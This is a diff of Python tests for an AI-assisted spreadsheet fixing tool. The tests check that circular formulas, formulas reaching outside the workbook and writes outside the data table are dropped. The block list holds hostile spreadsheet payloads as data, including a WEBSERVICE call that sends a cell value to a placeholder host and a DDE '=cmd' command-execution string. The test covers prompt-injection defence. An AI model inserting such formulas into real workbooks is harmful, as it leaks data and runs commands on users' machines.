@@ -121,13 +121,13 @@ def test_refers_to_itself_catches_circular_formulas():
 
 def test_suggest_fix_drops_circular_formula(monkeypatch):
     answer = {"explanation": "Median.", "changes": [{"cell": "C3", "new": "=MEDIAN(C2:C4)"},
-                                                   {"cell": "D3", "new": "=MEDIAN(D2,D4)"}]}
+                                                   {"cell": "C2", "new": "=MEDIAN(C3,C4)"}]}
     srv, sent = stub_api(monkeypatch, [{"type": "text", "text": json.dumps(answer)}])
     try:
         out = triage.suggest_fix(COLS, ROWS, 1, 0, 0, "low", "")
     finally:
         srv.shutdown()
-    assert out["changes"] == [{"cell": "D3", "new": "=MEDIAN(D2,D4)"}]
+    assert out["changes"] == [{"cell": "C2", "new": "=MEDIAN(C3,C4)"}]
     assert "Left out C3" in out["explanation"]
     assert "never refer to the cell it is written into" in sent[0]["messages"][0]["content"]
 
@@ -136,11 +136,13 @@ def test_suggest_fix_drops_formulas_that_reach_outside_the_workbook(monkeypatch)
     bad = ['=WEBSERVICE("https://x/?"&A2)', '=IMAGE("https://x/a.png")', '=HYPERLINK("http://x","go")',
            "=[Other.xlsx]Sheet1!A1", "=FILTERXML(A1,\"//a\")", "=cmd|'/c calc'!A1", '+WEBSERVICE("https://x")',
            ' @HYPERLINK("http://x")']
+    wide = COLS + ["D", "E"]  # a table wide and long enough to hold every proposed cell
+    rows = [r + ["", ""] for r in ROWS] + [["2026-01-09", "East", 1, "", ""]] * 6
     answer = {"explanation": "x", "changes": [{"cell": f"D{k + 2}", "new": f} for k, f in enumerate(bad)]
               + [{"cell": "E2", "new": "=AVERAGEIFS(C2:C3,B2:B3,\"East\")"}, {"cell": "E3", "new": "imaging"}]}
     srv, _ = stub_api(monkeypatch, [{"type": "text", "text": json.dumps(answer)}])
     try:
-        out = triage.suggest_fix(COLS, ROWS, 1, 0, 0, "", "")
+        out = triage.suggest_fix(wide, rows, 1, 0, 0, "", "")
     finally:
         srv.shutdown()
     assert [c["cell"] for c in out["changes"]] == ["E2", "E3"]  # plain text values are never formulas
@@ -161,3 +163,17 @@ def test_engine_reason_wording_the_panel_reads():
     rows = [[k, 10 + k % 3] for k in range(40)] + [[99, 500]]
     res = c.post("/scan", json={"columns": cols, "rows": rows, "limits": {"Units": [9, 13, 0, 20]}}).get_json()["rows"]
     assert "Units weird limit is 20; this is 500" in res[-1]["reason"]
+
+
+def test_suggest_fix_keeps_to_the_table(monkeypatch):  # a prompt-injected cell can't steer writes elsewhere on the sheet
+    last = f"{chr(64 + len(COLS))}{len(ROWS) + 1}"  # bottom-right data cell
+    answer = {"explanation": "x", "changes": [{"cell": "A1", "new": "Region"}, {"cell": last, "new": "7"},
+                                              {"cell": "ZZ9999", "new": "1"}, {"cell": f"A{len(ROWS) + 2}", "new": "1"},
+                                              {"cell": f"{chr(65 + len(COLS))}2", "new": "1"}]}
+    srv, sent = stub_api(monkeypatch, [{"type": "text", "text": json.dumps(answer)}])
+    try:
+        out = triage.suggest_fix(COLS, ROWS, 1, 0, 0, "low", "")
+    finally:
+        srv.shutdown()
+    assert [c["cell"] for c in out["changes"]] == ["A1", last]  # header row + data rows only
+    assert "outside the table" in out["explanation"] and "ZZ9999" in out["explanation"]
